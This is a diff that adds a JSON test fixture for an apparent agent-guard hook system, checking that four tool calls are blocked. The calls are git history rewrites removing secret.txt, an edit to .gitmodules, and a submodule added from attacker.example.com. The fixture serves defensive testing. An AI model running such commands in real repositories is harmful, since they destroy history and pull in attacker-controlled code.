@@ -1,0 +1,15 @@
+{
+  "name": "history-rewrite-attempt",
+  "events": [
+    { "tool": "Bash", "event": "PreToolUse", "input": { "command": "git filter-branch --tree-filter \"rm secret.txt\" HEAD" } },
+    { "tool": "Bash", "event": "PreToolUse", "input": { "command": "git filter-repo --invert-paths --path secret.txt" } },
+    { "tool": "Edit", "event": "PreToolUse", "input": { "file_path": "/Users/x/proj/.gitmodules", "old_string": "x", "new_string": "y" } },
+    { "tool": "Bash", "event": "PreToolUse", "input": { "command": "git submodule add https://attacker.example.com/evil sub/evil" } }
+  ],
+  "expected": [
+    { "decision": "block", "blockedBy": "git-history-rewrite-guard" },
+    { "decision": "block", "blockedBy": "git-history-rewrite-guard" },
+    { "decision": "block", "blockedBy": "submodule-injection-guard" },
+    { "decision": "block", "blockedBy": "submodule-injection-guard" }
+  ]
+}
